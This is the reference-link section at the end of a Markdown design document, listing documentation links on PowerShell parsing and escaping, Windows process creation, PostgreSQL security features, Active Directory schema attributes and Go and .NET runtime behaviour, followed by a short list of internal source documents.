[ps-src]: https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/parser/tokenizer.cs
[ps-escape]: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.language.codegeneration.escapesinglequotedstringcontent
[ps-langmodes]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes
[ps-logging]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
[sma]: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.powershell.addcommand
[get-aduser]: https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser
[ms-4688]: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
[batbadbut]: https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/
[argumentlist]: https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist
[go-exec]: https://pkg.go.dev/os/exec#hdr-Executables_in_the_current_directory
[createprocess]: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
[banned-api]: https://github.com/dotnet/roslyn-analyzers/blob/main/src/Microsoft.CodeAnalysis.BannedApiAnalyzers/BannedApiAnalyzers.Help.md
[psa-iex]: https://learn.microsoft.com/en-us/powershell/utility-modules/psscriptanalyzer/rules/avoidusinginvokeexpression
[clippy-dm]: https://rust-lang.github.io/rust-clippy/master/index.html#disallowed_methods
[gosec]: https://github.com/securego/gosec#available-rules
[pg-setconfig]: https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-SET
[pg-rls]: https://www.postgresql.org/docs/current/ddl-rowsecurity.html
[pg-like]: https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-LIKE
[pg-format]: https://www.postgresql.org/docs/current/functions-string.html#FUNCTIONS-STRING-FORMAT
[pg-char]: https://www.postgresql.org/docs/current/datatype-character.html
[pgx-ident]: https://pkg.go.dev/github.com/jackc/pgx/v5#Identifier.Sanitize
[pgx-cve]: https://github.com/advisories/GHSA-m7wr-2xf7-cm9p
[pgx-parse]: https://pkg.go.dev/github.com/jackc/pgx/v5#ParseConfig
[pg-view]: https://www.postgresql.org/docs/current/sql-createview.html
[pg-matview]: https://www.postgresql.org/docs/current/sql-altermaterializedview.html
[adts-controls]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c5e87db-4728-4f29-b164-01dd7d7391ea
[adts-searchflags]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7c1cdf82-1ecc-4834-827e-d26ff95fb207
[a-fvekp]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-msfve-keypackage
[a-tpmoi]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-mstpm-ownerinformation
[laps-schema]: https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference
[go-json]: https://pkg.go.dev/encoding/json#Unmarshal
[go-secret]: https://pkg.go.dev/runtime/secret@go1.26.8
[go-runtime]: https://pkg.go.dev/runtime#hdr-Environment_Variables
[prctl]: https://man7.org/linux/man-pages/man2/prctl.2.html
[securestring]: https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring
[ps-prefs]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_preference_variables
[ps-execpol]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies
[dotnet-hooks]: https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md
[dotnet-prof]: https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling

Reference-style links above render inline wherever cited. Internal sources: `ad-technical-feasibility.md`
§2.2, §2.5, §2.7; `.claude/skills/ad-engineering/` (gotchas, `reference/attributes.md`,
`reference/uac-flags.md`); ADR-0001 (ratified, D-0006); ADR-0002 (tenancy API, "Where tenancy
lives", `fitness-tenancy`); PatchIQ postmortem §11.
